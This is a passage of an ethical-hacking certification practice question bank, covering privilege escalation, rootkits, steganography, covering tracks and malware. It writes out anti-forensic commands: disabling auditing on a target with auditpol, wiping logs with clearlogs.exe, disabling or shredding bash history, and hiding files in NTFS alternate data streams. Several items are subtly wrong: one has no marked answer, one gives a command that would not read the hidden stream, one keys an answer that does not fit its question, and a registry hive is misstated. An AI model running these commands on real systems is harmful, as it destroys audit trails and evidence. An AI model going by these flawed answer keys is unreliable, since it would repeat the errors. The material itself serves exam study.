+ [ ] Linux
> **Explanation:**
> OS X provides several legitimate methods, such as setting the DYLD_INSERT_LIBRARIES environment variable, which are user specific. These methods force the loader to load malicious libraries automatically into a target running process. OS X allows the loading of weak dylibs (dynamic library) dynamically, which allows an attacker to place a malicious dylib in the specified location.

212. Which of the following vulnerability repositories is available online and allows attackers access to information about various software vulnerabilities?
+ [x] http://www.securityfocus.com
+ [ ] https://www.tarasco.org
+ [ ] http://project-rainbowcrack.com
+ [ ] http://foofus.net
> **Explanation:**
> Attackers search for any vulnerabilities on exploit sites such as Exploit Database (https://www.exploit-db.com), Security Focus (http://www.securityfocus.com), and Zero Day Initiative (http://zerodayinitiative.com). If a vulnerable component is identified, the attacker customizes the exploit as required and executes the attack. Successful exploitation allows attacker to cause serious data loss or takeover the control of servers. Attacker generally uses exploit sits to identify the web application exploits or performs vulnerability scanning using tools like Nessus and GFI LanGuard, to identify the existing vulnerable components.
> 
> http://foofus.net is an advanced security services forum that provides various tools for cyber security.
> 
> http://project-rainbowcrack.com provides RainbowCrack software used for cracking password hashes with rainbow tables.
> 
> https://www.tarasco.org is a website that contains security-related tools and published exploit codes.

213. Which of the following vulnerabilities allows attackers to trick a processor to exploit speculative execution to read restricted data?
+ [ ] DLL Hijacking
+ [x] Spectre
+ [ ] Dylib Hijacking
+ [ ] Meltdown
> **Explanation:**
> **Meltdown vulnerability:** This is found in all the Intel processors and ARM processors deployed by Apple. This vulnerability leads to tricking a process to access out-of-bounds memory by exploiting CPU optimization mechanisms such as speculative execution.
> 
> **Dylib hijacking:** This allows an attacker to inject a malicious dylib in one of the primary directories and simply load the malicious dylib at runtime.
> 
> **Spectre vulnerability:** Spectre vulnerability is found in many modern processors such as AMD, ARM, Intel, Samsung, and Qualcomm processors. This vulnerability leads to tricking a processor to exploit speculative execution to read restricted data. The modern processors implement speculative execution to predict the future and to complete the execution faster.
> 
> **DLL hijacking:** In DLL hijacking attackers place a malicious DLL in the application directory; the application will execute the malicious DLL in place of the real DLL.

214. Which of the following techniques do attackers use to escalate privileges in the Windows operating system?
+ [x] Application Shimming
+ [ ] Plist Modification
+ [ ] Setuid and Setgid
+ [ ] Launch Daemon
> **Explanation:**
> The Windows operating system uses Windows application compatibility framework called Shim to provide compatibility between the older and newer versions of Windows. An attacker can use these shims to perform different attacks such as disabling Windows defender, privilege escalation, installing backdoors, and so on.

215. Which of the following techniques allows attackers to inject malicious script on a web server to maintain persistent access and escalate privileges?
+ [ ] Access Token Manipulation
+ [x] Web Shell
+ [ ] Launch daemon
+ [ ] Scheduled Task
> **Explanation:**
> Scheduled task: The Windows operating system includes utilities such as “at” and “schtasks.” A user with administrator privileges can use these utilities in conjunction with the task scheduler to schedule programs or scripts that can be executed at a particular date and time. If a user provides proper authentication, he can also schedule a task from a remote system using RPC. An attacker can use this technique to execute malicious programs at system startup, maintain persistence, perform remote execution, escalate privileges, etc.
> 
> Web shell: A web shell is a web-based script that allows access to a web server. Web shells can be created in all the operating systems like Windows, Linux, MacOS, and OS X. Attackers create web shells to inject malicious script on a web server to maintain persistent access and escalate privileges. Attackers use a web shell as a backdoor to gain access and control a remote server. Generally, a web shell runs under current user’s privileges. Using a web shell an attacker can perform privilege escalation by exploiting local system vulnerabilities. After escalating the privileges, an attacker can install malicious software, change user permissions, add or remove users, steal credentials, read emails, etc.
> 
> Launch daemon: At the time of MacOS and OS X booting process, launchd is executed to complete the system initialization process. Parameters for each launch-on-demand system-level daemon found in /System/Library/LaunchDaemonsand/Library/LaunchDaemons are loaded using launchd. These daemons have property list files (plist) that are linked to executables that run at the time of booting. Attackers can create and install a new launch daemon, which can be configured to execute at boot-up time using launchd or launchctl to load plist into concerned directories. The weak configurations allow an attacker to alter the existing launch daemon’s executable to maintain persistence or to escalate privileges.
> 
> Access token manipulation: In Windows operating system, access tokens are used to determine the security context of a process or thread. These tokens include the access profile (identity and privileges) of a user associated with a process. After a user is authenticated, the system produces an access token. Every process the user executes makes use of this access token. The system verifies this access token when a process is accessing a secured object.

216. Which of the following vulnerabilities is found in all the Intel processors and ARM processors deployed by Apple (and others) and leads to tricking a process to access out of bounds memory by exploiting CPU optimization mechanisms such as speculative execution?
+ [ ] Dylib Hijacking
+ [x] Meltdown
+ [ ] DLL Hijacking
+ [ ] Privilege escalation
> **Explanation:**
> Privilege escalation: In a privilege escalation attack, attackers first gain access to the network using a non-admin user account, and then try to gain administrative privileges. Attackers take advantage of design flaws, programming errors, bugs, and configuration oversights in the OS and software application to gain administrative access to the network and its associated applications.
> 
> Dylib hijacking: OS X similar to windows is vulnerable to dynamic library attacks. OS X provides several legitimate methods such as setting the DYLD_INSERT_LIBRARIES environment variable, which are user specific. These methods force the loader to load malicious libraries automatically into a target running process. OS X allows loading of weak dylibs (dynamic library) dynamically, which allows an attacker to place a malicious dylib in the specified location. In many cases, the loader searches for dynamic libraries in multiple paths. This helps an attacker to inject a malicious dylib in one of the primary directories and simply load the malicious dylib at runtime. Attackers can take advantage of such methods to perform various malicious activities such as stealthy persistence, run-time process injection, bypassing security software, bypassing Gatekeeper, etc.
> 
> Meltdown: Meltdown vulnerability is found in all the Intel processors and ARM processors deployed by Apple. This vulnerability leads to tricking a process to access out of bounds memory by exploiting CPU optimization mechanisms such as speculative execution. For example, an attacker requests to access an illegal memory location. He/she sends a second request to conditionally read a valid memory location. In this case, the processor using speculative execution will complete evaluating the result for both requests before checking the first request. When the processor checks that the first request is invalid, it rejects both the requests after checking privileges. Even though the processor rejects both the requests, the result of both the requests remains in the cache memory. Now the attacker sends multiple valid requests to access out of bounds` memory locations.
> 
> DLL hijacking: Most Windows applications do not use the fully qualified path when loading an external DLL library; instead, they first search the directory from which they have been loaded. Taking this as an advantage, if attackers can place a malicious DLL in the application directory, the application will execute the malicious DLL in place of the real DLL.

217. Which of the following techniques is used to place an executable in a particular path in such a way that it will be executed by the application in place of the legitimate target?
+ [ ] Scheduled Task
+ [ ] Application Shimming
+ [x] Path Interception
+ [ ] File System Permissions Weakness
> **Explanation:**
> Path interception is a method of placing an executable in a particular path in such a way that it will be executed by the application in place of the legitimate target. Attackers can take advantage of several flaws or misconfigurations to perform path interception like unquoted paths (service paths and shortcut paths), path environment variable misconfiguration, and search order hijacking. Path interception helps an attacker to maintain persistence on a system and escalate privileges.


## Techniques to Maintain Access
218. Which of the following are valid types of rootkits? (Choose three.)
+ [ ] Network level
+ [ ] Physical level
+ [ ] Data access level
+ [x] Hypervisor level
+ [x] Application level
+ [x] Kernel level
> **Explanation:**
> **Hypervisor-level rootkit:** Attackers create hypervisor-level rootkits by exploiting hardware features such as Intel VT and AMD-V. These rootkits run in Ring-1, host the operating system of the target machine as a virtual machine, and intercept all hardware calls made by the target operating system. This kind of rootkit works by modifying the system’s boot sequence and gets loaded instead of the original virtual machine monitor.
> 
> **Kernel-level rootkit:** The kernel is the core of the operating system. Kernel-level rootkit runs in Ring-0 with highest operating system privileges. These cover backdoors on the computer and are created by writing additional code or by substituting portions of kernel code with modified code via device drivers in Windows or loadable kernel modules in Linux. If the kit’s code contains mistakes or bugs, kernel-level rootkits affect the stability of the system. These have the same privileges of the operating system; hence, they are difficult to detect and intercept or subvert the operations of operating systems.
> 
> **Application-level rootkit:** Application-level rootkit operates inside the victim’s computer by replacing the standard application files (application binaries) with rootkits or by modifying behavior of present applications with patches, injected malicious code, and so on.

219. Fill in the blank _________________ type of rootkit is most difficult to detect.
+ [ ] Hardware/Firmware Rootkit
+ [x] Kernel Level Rootkit
+ [ ] Application Rootkit
+ [ ] Hypervisor Rootkit
> **Explanation:**
> **Hardware/Firmware Rootkit:** Uses device/platform firmware to create persistent malware image in hardware, like HDD, System BIOS, Network Card. Code integrity tool does not inspect the integrity of firmware.  
> 
> **Application Rootkit:** This replaces standard application files by modifying behavior of present applications with patches, injected malicious code.
> 
> **Hypervisor Rootkit:** The Hypervisor  hosts operating system of the target machine as a virtual machine and intercepts all hardware calls made by the target operating system.
> 
> **Kernel Level Rootkit:** The kernel is the core of the operating system. Kernel level rootkit runs in Ring-0 with highest operating system privileges. These cover backdoors on the computer and are created by writing additional code or by substituting portions of kernel code with modified code via device drivers in Windows or loadable kernel modules in Linux. If the kit’s code contains mistakes or bugs, kernel-level rootkits affect the stability of the system. These have the same privileges of the operating system; hence, they are difficult to detect and intercept or subvert the operations of operating systems.

220. Which of the following is not a defense technique against malicious NTFS streams?
+ [ ] Use File Integrity Monitoring tool like tripwire
+ [ ] Use up-to-date antivirus software
+ [ ] Move suspected files to FAT partition
+ [x] Write critical data to alternate data streams
> **Explanation:**
> You should do the following to defend against malicious NTFS streams:
> + To delete hidden NTFS streams, move the suspected files to FAT partition
> + Use third-party file integrity checker such as Tripwire File Integrity Monitor to maintain
> + integrity of NTFS partition files against unauthorized ADS
> + Use third-party utilities such as EventSentry or adslist.exe to show and manipulate
> + hidden streams
> + Avoid writing important or critical data to alternate data streams
> + Use up-to-date antivirus software on your system.
> + Enable real-time antivirus scanning to protect against execution of malicious streams
> + Use file-monitoring software such as Stream Detector (http://www.novirusthanks.org) and ADS Detector (https://sourceforge.net/projects/adsdetector/?source=directory) to help detect creation of additional or new data streams.

221. Which one of the following techniques is used by attackers to hide their programs?
+ [x] NTFS Stream
+ [ ] Scanning
+ [ ] Enumeration
+ [ ] Footprinting
> **Explanation:**
> **Scanning:** Scanning is the process of gathering additional detailed information about the target by using highly complex and aggressive reconnaissance techniques. Network scanning refers to a set of procedures used for identifying hosts, ports, and services in a network. It is one of the most important phases of intelligence gathering for an attacker which enables him/her to create a profile of the target organization.
> 
> **NTFS Stream:** Using NTFS data steam, an attacker can almost completely hide files within the system. It is easy to use the streams but the user can only identify it with specific software. Explorer can display only the root files; it cannot view the streams linked to the root files and cannot define the disk space used by the streams. As such, if a virus implants itself into ADS, it is unlikely that usual security software will identify it.
> 
> **Enumeration:** Enumeration is the process of extracting user names, machine names, network resources,shares, and services from a system or network. In the enumeration phase, attacker creates active connections with system and performs directed queries to gain more information about the target. The attackers use the information collected by means of enumeration to identify the vulnerabilities or weak points in the system security, which helps them exploit the target system.
> 
> **Footprinting:** Footprinting, the first step in ethical hacking, refers to the process of collecting information about a target network and its environment. Using footprinting, you can find a number of opportunities to penetrate and assess the target organization’s network.

222. Which one of the following software program helps the attackers to gain unauthorized access to a remote system and perform malicious activities?
+ [ ] Antivirus
+ [x] Rootkit
+ [ ] Anti-spyware
+ [ ] Keylogger
> **Explanation:**
> **Anti-Spyware:** Anti-spyware provides real-time protection by scanning your system at regular intervals, either weekly or daily. It scans to ensure the computer is free from malicious software.
> 
> **Keyloggers:** A keylogger is a hardware or software program that secretly records each keystroke on the user keyboard at any time. Keyloggers save captured keystrokes to a file for reading later or transmit them to a place where the attacker can access it.
> 
> **Rootkit:** Rootkits are software programs aimed to gain access to a computer without detection. These are malware that help the attackers to gain unauthorized access to a remote system and perform malicious activities. The goal of the rootkit is to gain root privileges to a system. By logging in as the root user of a system, an attacker can perform any task such as installing software or deleting files, and so on.
> 
> **Antivirus:** Antivirus is a software used to protect, detect, prevent, and remove malicious programs from systems and networks.

223. Which type of rootkit is created by attackers by exploiting hardware features such as Intel VT and AMD-V?
+ [x] Hypervisor Level Rootkit
+ [ ] Kernel Level Rootkit
+ [ ] Boot Loader Level Rootkit
+ [ ] Hardware/Firmware Rootkit
> **Explanation:**
> **Hypervisor Level Rootkit:** Attackers create Hypervisor level rootkits by exploiting hardware features such as Intel VT and AMD-V. These rootkits runs in Ring-1 and host the operating system of the target machine as a virtual machine and intercept all hardware calls made by the target operating system. This kind of rootkit works by modifying the system’s boot sequence and gets loaded instead of the original virtual machine monitor.
> 
> **Hardware/Firmware Rootkit:** Hardware/firmware rootkits use devices or platform firmware to create a persistent malware image in hardware, such as a hard drive, system BIOS, or network card. The rootkit hides in firmware as the users do not inspect it for code integrity. A firmware rootkit implies the use of creating a permanent delusion of rootkit malware.
> 
> **Kernel Level Rootkit:** The kernel is the core of the operating system. Kernel level rootkit runs in Ring-0 with highest operating system privileges. These cover backdoors on the computer and are created by writing additional code or by substituting portions of kernel code with modified code via device drivers in Windows or loadable kernel modules in Linux.
> 
> **Boot Loader Level Rootkit:** Boot loader level (bootkit) rootkits function either by replacing or modifying the legitimate bootloader with another one. The boot loader level (bootkit) can activate even before the operating system starts. So, the boot-loader level (bootkit) rootkits are serious threats to security because they can help in hacking encryption keys and passwords.

224. In the options given below; identify the nature of a library-level rootkit?
+ [x] Works higher up in the OS and usually patches, hooks, or supplants system calls with backdoor versions
+ [ ] Functions either by replacing or modifying the legitimate bootloader with another one
+ [ ] Operates inside the victim’s computer by replacing the standard application files
+ [ ] Uses devices or platform firmware to create a persistent malware image in hardware
> **Explanation:**
> **Application Level Rootkit:** Application level rootkit operates inside the victim’s computer by replacing the standard application files (application binaries) with rootkits or by modifying behavior of present applications with patches, injected malicious code, and so on.
> 
> **Boot Loader Level Rootkit:** Boot loader level (bootkit) rootkits function either by replacing or modifying the legitimate bootloader with another one. The boot loader level (bootkit) can activate even before the operating system starts. So, the boot-loader level (bootkit) rootkits are serious threats to security because they can help in hacking encryption keys and passwords.
> 
> **Library Level Rootkits:** Library level rootkits work higher up in the OS and they usually patch, hook, or supplant system calls with backdoor versions to keep the attacker unknown. They replace original system calls with fake ones to hide information about the attacker.
> 
> **Hardware/Firmware Rootkit:** Hardware/firmware rootkits use devices or platform firmware to create a persistent malware image in hardware, such as a hard drive, system BIOS, or network card. The rootkit hides in firmware as the users do not inspect it for code integrity. A firmware rootkit implies the use of creating a permanent delusion of rootkit malware.

225. Which of the following techniques refers to the art of hiding data “behind” other data without the target’s knowledge?
+ [ ] Enumeration
+ [x] Steganography
+ [ ] Footprinting
+ [ ] Scanning
> **Explanation:**
> **Scanning:** Scanning is the process of gathering additional detailed information about the target by using highly complex and aggressive reconnaissance techniques. Network scanning refers to a set of procedures used for identifying hosts, ports, and services in a network. It is one of the most important phases of intelligence gathering for an attacker which enables him/her to create a profile of the target organization.
> 
> **Steganography:** Steganography refers to the art of hiding data “behind” other data without the target’s knowledge. Thus, Steganography hides the existence of the message. It replaces bits of unused data into the usual files such as graphic, sound, text, audio, video, etc. with some other surreptitious bits. The hidden data can be plaintext or ciphertext, or it can be an image.
> 
> **Enumeration:** Enumeration is the process of extracting user names, machine names, network resources,shares, and services from a system or network. In the enumeration phase, attacker creates active connections with system and performs directed queries to gain more information about the target. The attackers use the information collected by means of enumeration to identify the vulnerabilities or weak points in the system security, which helps them exploit the target system.
> 
> **Footprinting:** Footprinting, the first step in ethical hacking, refers to the process of collecting information about a target network and its environment. Using footprinting, you can find a number of opportunities to penetrate and assess the target organization’s network.

226. In which of the following techniques is the text or an image considerably condensed in size, up to one page in a single dot, to avoid detection by unintended recipients?
+ [ ] Spread Spectrum
+ [x] Microdots
+ [ ] Invisible Ink
+ [ ] Computer-Based Methods
> **Explanation:**
> Microdots: A microdot is text or an image considerably condensed in size (with the help of a reverse microscope), up to one page in a single dot, to avoid detection by unintended recipients. Microdots are usually circular, about one millimeter in diameter, but are changeable into different shapes and sizes.
> 
> Computer-based methods: A computer-based method makes changes to digital carriers to embed information foreign to the native carriers. Communication of such information occurs in the form of text, binary files, disk and storage devices, and network traffic and protocols, and can alter the software, speech, pictures, videos or any other digitally represented code for transmission.
> 
> Invisible ink: Invisible ink, or “security ink,” is one of the methods of technical steganography. It is used for invisible writing with colorless liquids and can later be made visible by certain pre-negotiated manipulations such as lighting or heating. For example, if you use onion juice and milk to write a message, the writing will be invisible, but when heat is applied, it turns brown and the message becomes visible.
> 
> Spread spectrum: This technique is less susceptible to interception and jamming. In this technique, communication signals occupy more bandwidth than required to send the information. The sender increases the band spread by means of code (independent of data), and the receiver uses a synchronized reception with the code to recover the information from the spread spectrum data.

227. Which of the following steganography techniques allows the user to add white spaces and tabs at the end of the lines?
+ [ ] Folder Steganography
+ [x] Document steganography
+ [ ] Video steganography
+ [ ] Image Steganography
> **Explanation:**
> **Image Steganography:** Image steganography allows you to conceal your secret message within an image. You can take advantage of the redundant bit of the image to conceal your message within it. These redundant bits are those bits of the image that have very little effect on the image, if altered. Detection of this alteration is not easy. You can conceal your information within images of different formats (e.g., .PNG, .JPG, .BMP).
> 
> **Document Steganography:** As with image steganography, document steganography is the technique of hiding secret messages transferred in the form of documents. It includes addition of white spaces and tabs at the end of the lines. Stego-document is a cover document comprising of the hidden message. Steganography algorithms, referred to as the “stego system, are employed for hiding the secret messages in the cover medium at the sender end. The same algorithm is used for extracting the hidden message from the stego-document by the recipient.
> 
> **Folder Steganography:** Folder steganography refers to hiding secret information in folders. Files are hidden and encrypted within a folder and are not seen by the normal Windows applications, including Windows Explorer.
> 
> **Video Steganography:** Video steganography refers to hiding secret information into a carrier video file. The information is hidden in video files of different formats such as .AVI, .MPG4, .WMV, etc. Discrete Cosine Transform (DCT) manipulation is used to add secret data at the time of the transformation process of the video.


## Techniques to Clear Tracks
228. Which of the following techniques do attackers use to cover the tracks?
+ [x] Disable auditing
+ [ ] Steganalysis
+ [ ] Steganography
+ [ ] Scanning
> **Explanation:**
> + **Steganography:** This refers to the art of hiding data “behind” other data without the target’s knowledge.
> + **Steganalysis:** This is a process of discovering the existence of the hidden information in a medium.
> + **Disable auditing:** This is the technique where an attacker disables auditing features of the target system to cover the tracks.
> + **Scanning:** This refers to a set of procedures used for identifying hosts, ports, and services in a network.

229. Identify the technique used by the attackers to wipe out the entries corresponding to their activities in the system log to remain undetected?
+ [ ] Escalating privileges
+ [ ] Executing applications
+ [x] Clearing logs
+ [ ] Gaining access
> **Explanation:**
> + **Executing Applications:** Once attackers have administrator privileges, they attempt to install malicious programs such as Trojans, Backdoors, Rootkits, and Keyloggers, which grant them remote system access, thereby enabling them to execute malicious codes remotely. Installing Rootkits allows them to gain access at the operating system level to perform malicious activities. To maintain access for use at a later date, they may install Backdoors.
> + **Escalating Privileges:** After gaining access to a system using a low-privileged normal user account, attackers may then try to increase their administrator privileges to perform protected system operations, so that they can proceed to the next level of the system hacking phase: to execute applications. Attackers exploit known system vulnerabilities to escalate user privileges.
> + **Gaining Access:** In system hacking, the attacker first tries to gain access to a target system using information obtained and loopholes found in the system’s access control mechanism. Once attackers succeed in gaining access to the system, they are free to perform malicious activities such as stealing sensitive data, implementing a sniffer to capture network traffic, and infecting the system with malware.
> + **Clearing Logs:** To maintain future system access, attackers attempt to avoid recognition by legitimate system users. To remain undetected, attackers wipe out the entries corresponding to their activities in the system log, thus avoiding detection by users.

230. What is the command used by an attacker to establish a null session with the target machine?
+ [ ] `C:\clearlogs.exe -app`
+ [ ] `auditpol /get /category:*`
+ [x] `C:\>auditpol \\<ip address of target>`
+ [ ] `C :\>auditpol \\<ip address of target> /disable`
> **Explanation:**
> Auditpol.exe is the command-line utility tool to change Audit Security settings at the category and sub-category levels. Attackers can use AuditPol to enable or disable security auditing on local or remote systems and to adjust the audit criteria for different categories of security events.
> + The attacker would establish a null session to the target machine and run the command:
> 	+ `C:\>auditpol \\<ip address of target>`
> + This will reveal the current audit status of the system. He or she can choose to disable the auditing by:
> 	+ `C :\>auditpol \\<ip address of target> /disable`
> 
> This will make changes in the various logs that might register the attacker’s actions. He/she can choose to hide the registry keys changed later on.
> 
> The moment that intruders gain administrative privileges, they disable auditing with the help of auditpol.exe. Once they complete their mission, they again turn on auditing by using the same tool (audit.exe).
> + Attackers can use AuditPol to view defined auditing settings on the target computer, running the following command at the command prompt:
> 	+ `auditpol /get /category:*`
> + Run clearlogs.exe from the command prompt, for clearing application logs
> 	+ `C:\clearlogs.exe -app`

231. Which of the following techniques is used by the attackers to clear online tracks?
+ [ ] Disable LMNR and NBT-NS services
+ [x] Disable auditing
+ [ ] Disable the user account
+ [ ] Disable LAN manager
> **Explanation:**
> Techniques used for Clearing Tracks
> 
> The main activities that an attacker performs toward removing his/her traces on the computer are:
> + Disable auditing: An attacker disables auditing features of the target system
> + Clearing logs: An attacker clears/deletes the system log entries corresponding to his/her activities
> + Manipulating logs: An attacker manipulates logs in such a way that he/she will not be caught in legal actions

232. Which of the following commands is used to disable the BASH shell from saving the history?
+ [ ] history -w
+ [ ] shred ~/.bash_history
+ [x] export HISTSIZE=0
+ [ ] history –c
> **Explanation:**
> + **history –c:** This command is useful in clearing the stored history.
> + **export HISTSIZE=0:** This command disables the BASH shell from saving the history by setting the size of the history file to 0.
> + **history–w:** This command only deletes the history of the current shell, whereas the command history of other shells remain unaffected.
> + **shred ~/.bash_history:** This command shreds the history file, making its contents unreadable.

233. Which of the following technique is used by the attacker to distribute the payload and to create covert channels?
+ [ ] Covering tracks
+ [x] TCP Parameters
+ [ ] Clear online tracks
+ [ ] Performing steganalysis
> **Explanation:**
> **TCP Parameters:** TCP parameters can be used by the attacker to distribute the payload and to create covert channels. Some of the TCP fields where data can be hidden are as follow:
> + IP Identification field: This is an easy approach where a payload is transferred bitwise over an established session between two systems. Here, one character is encapsulated per packet.
> + TCP acknowledgement number: This approach is quite difficult as it uses a bounce server that receives packets from the victim and sends it to an attacker. Here, one hidden character is relayed by the bounce server per packet.
> + TCP initial sequence number: This method also does not require an established connection between two systems. Here, one hidden character is encapsulated per SYN request and Reset packets.
> 
> **Clear Online Tracks:** Attackers clear online tracks maintained using web history, logs, cookies, cache, downloads, visited time, and others on the target computer, so that victims cannot notice what online activities attackers have performed.
> 
> **Covering Tracks:** Covering tracks is one of the main stage during system hacking. In this stage, the attacker tries to hide and avoid being detected, or “traced out,” by covering all “tracks,” or logs, generated while gaining access to the target network or computer.
> 
> **Steganalysis:** Steganalysis is the process of discovering the existence of the hidden information in a medium. Steganalysis is the reverse process of steganography. It is one of the attacks on information security in which attacker called a steganalyst tries to detect the hidden messages embedded in images, text, audio and video carrier mediums using steganography.

234. Which of the following is used by an attacker to manipulate the log files?
+ [ ] Clear_Event_Viewer_Logs.bat
+ [ ] Auditpol.exe
+ [ ] clearlogs.exe
+ [x] SECEVENT.EVT
> **Explanation:**
> **Auditpol.exe:** Auditpol.exe is the command line utility tool to change Audit Security settings at the category and sub-category levels. Attackers can use AuditPol to enable or disable security auditing on local or remote systems and to adjust the audit criteria for different categories of security events.
> 
> **Clear_Event_Viewer_Logs.bat/clearlogs.exe:** The Clear_Event_Viewer_Logs.bat or clearlogs.exe is a utility that can be used to wipe out the logs of the target system. This utility can be run through command prompt, PowerShell, and using a BAT file to delete security, system, and application logs on the target system. Attackers might use this utility, wiping out the logs as one method of covering their tracks on the target system.
> 
> **SECEVENT.EVT:** Attackers may not wish to delete an entire log to cover their tracks, as doing so may require admin privileges. If attackers are able to delete only attack event logs, they will still be able to escape detection.
> + The attacker can manipulate the log files with the help of: SECEVENT.EVT (security): failed logins, accessing files without privileges
> + SYSEVENT.EVT (system): Driver failure, things not operating correctly
> + APPEVENT.EVT (applications)

235. In a Windows system, an attacker was found to have run the following command:  
type C:\SecretFile.txt >C:\LegitFile.txt:SecretFile.txt  
What does the above command indicate?  
+ [ ] The attacker has used Alternate Data Streams to copy the content of SecretFile.txt file into LegitFile.txt.
+ [ ] The attacker was trying to view SecretFile.txt file hidden using an Alternate Data Stream.
+ [ ] The attacker has used Alternate Data Streams to rename SecretFile.txt file to LegitFile.txt.
+ [x] The attacker has used Alternate Data Streams to hide SecretFile.txt file into LegitFile.txt.
> **Explanation:**
> NTFS has a feature called as Alternate Data Streams that allows attackers to hide a file behind other normal files. Given below are some steps in order to hide file using NTFS:
> + Open the command prompt with an elevated privilege
> + Type the command “type C:\SecretFile.txt >C:\LegitFile.txt:SecretFile.txt”  
    (here, LegitFile.txt file is kept in C drive where SecretFile.txt file is hidden inside LegitFile.txt file)
> + To view the hidden file, type “more < C:\SecretFile.txt” (for this you need to know the hidden file name)

236. Which of the following is an sh-compatible shell that stores command history in a file?
+ [ ] Zsh
+ [ ] Tcsh/Csh
+ [ ] BASH
+ [ ] ksh
> **Explanation:**
> + **BASH:** The BASH or Bourne Again Shell is an sh-compatible shell which stores command history in a file called bash history. You can view the saved command history using more ~/.bash_history command. This feature of BASH is a problem for hackers as the bash_history file could be used by investigators in order to track the origin of an attack and the exact commands used by an intruder in order to compromise a system.
> + **Tcsh:** This is a Unix shell and compatible with C shell. It comes with features such as command-line completion and editing, etc. Users cannot define functions using tcsh script. They need to use scripts such as Csh to write functions.
> + **Zsh:** This shell can be used as an interactive login shell as well as a command-line interpreter for writing shell scripts. It is an extension of the Bourne shell and includes a vast number of improvements.
> + **Ksh:** It improved version of the Bourne shell that includes floating-point arithmetic, job control, command aliasing, and command completion.

237. Which of the following registry entry you will delete to clear Most Recently Used (MRU) list?
+ [x] HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
+ [ ] HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts
+ [ ] HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2
+ [ ] HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AppKey
> **Explanation:**
> + HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AppKey stores the hotkeys.  
> + HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts is responsible for file extension association.  
> + HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs key maintains a list of recently opened or saved files via Windows Explorer-style dialog boxes.  
> + HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2 stores the network locations.

# Malware Threats
## Malware and Propagation Techniques
238. A covert channel is a channel that:
+ [x] Transfers information over, within a computer system, or network that is outside of the security policy.
+ [ ] Transfers information over, within a computer system, or network that is encrypted.
+ [ ] Transfers information via a communication path within a computer system, or network for transfer of data.
+ [ ] Transfers information over, within a computer system, or network that is within the security policy.
> **Explanation:**
> “Overt” refers to something that is explicit, obvious, or evident, whereas “covert” refers to something that is secret, concealed, or hidden. An overt channel is a legal channel for the transfer of data or information in a company network and works securely to transfer data and information. On the other hand, a covert channel is an illegal, hidden path used to transfer data from a network.
> 
> Covert channels are methods attackers can use to hide data in an undetectable protocol. They rely on a technique called tunneling, which enables one protocol to transmit over the other. Any process or a bit of data can be a covert channel. This makes it an attractive mode of transmission for a Trojan because an attacker can use the covert channel to install a backdoor on the target machine.

239. Which of the following channels is used by an attacker to hide data in an undetectable protocol?
+ [x] Covert
+ [ ] Classified
+ [ ] Encrypted
+ [ ] Overt
> **Explanation:**
> “Overt” refers something that is explicit, obvious, or evident, whereas “covert” refers to something that is secret, concealed, or hidden. An overt channel is a legal channel for the transfer of data or information in a company network and works securely to transfer data and information. On the other hand, a covert channel is an illegal, hidden path used to transfer data from a network.
> 
> Covert channels are methods attackers can use to hide data in an undetectable protocol. They rely on a technique called tunneling, which enables one protocol to transmit over the other. Any process or a bit of data can be a covert channel. This makes it an attractive mode of transmission for a Trojan because an attacker can use the covert channel to install a backdoor on the target machine.

240. Which of the following techniques rely on tunneling to transmit one protocol data in another protocol?
+ [ ] Steganography
+ [ ] Asymmetric routing
+ [x] A covert channel
+ [ ] Scanning
> **Explanation:**
> **Scanning:** Scanning is the process of gathering additional detailed information about the target by using highly complex and aggressive reconnaissance techniques. Network scanning refers to a set of procedures used for identifying hosts, ports, and services in a network.
> 
> **Steganography:** Steganography refers to the art of hiding data “behind” other data without the target’s knowledge. Thus, Steganography hides the existence of the message. It replaces bits of unused data into the usual files such as graphic, sound, text, audio, video, etc. with some other surreptitious bits. The hidden data can be plaintext or ciphertext, or it can be an image.
> 
> **Covert channel:** Covert channels are methods attackers can use to hide data in an undetectable protocol. They rely on a technique called tunneling, which enables one protocol to transmit over the other. Any process or a bit of data can be a covert channel. This makes it an attractive mode of transmission for a Trojan because an attacker can use the covert channel to install a backdoor on the target machine.
> 
> **Asymmetric routing:** It is a routing technique where packets flowing through TCP connections travel through different routes to different directions.

241. Which of the following Rootkit Trojans performs targeted attacks against various organizations and arrives on the infected system by being downloaded and executed by the Trickler dubbed "DoubleFantasy," covered by TSL20110614-01 (Trojan.Win32.Micstus.A)?
+ [x] EquationDrug rootkit
+ [ ] Hardware/firmware rootkit
+ [ ] GrayFish rootkit
+ [ ] Boot loader level rootkitc
> **Explanation:**
> **GrayFish Rootkit:** GrayFish is a Windows kernel rootkit that runs inside the Windows operating system and provides an effective mechanism, hidden storage and malicious command execution while remaining invisible. It injects its malicious code into the boot record which handles the launching of Windows at each step. It implements its own Virtual File System (VFS) to store the stolen data and its own auxiliary information.
> 
> **Hardware/Firmware Rootkit:** Hardware/firmware rootkits use devices or platform firmware to create a persistent malware image in hardware, such as a hard drive, system BIOS, or network card. The rootkit hides in firmware as the users do not inspect it for code integrity. A firmware rootkit implies the use of creating a permanent delusion of rootkit malware.
> 
> **Boot Loader Level Rootkit:** Boot loader level (bootkit) rootkits function either by replacing or modifying the legitimate bootloader with another one. The boot loader level (bootkit) can activate even before the operating system starts. So, the boot-loader-level (bootkit) rootkits are serious threats to security because they can help in hacking encryption keys and passwords.
> 
> **EquationDrug Rootkit:** EquationDrug is a dangerous computer rootkit that attacks the Windows platform. It performs targeted attacks against various organizations and arrives on the infected system by being downloaded and executed by the Trickler dubbed "DoubleFantasy", covered by TSL20110614-01 (Trojan.Win32.Micstus.A). It allows a remote attacker to execute shell commands on the infected system.

242. Stephany is worried because in the past six weeks she has received two and three times the amount of e-mails that she usually receives, and most of it is not related to her work. What kind of problem is Stephany facing?
+ [ ] External Attack
+ [ ] Phishing
+ [x] SPAM
+ [ ] Malware
> **Explanation:**
> The characteristic of this scenario is the definition of SPAM. SPAM e-mail, also known as junk e-mail, is a type of electronic spam where unsolicited messages are sent by e-mails.

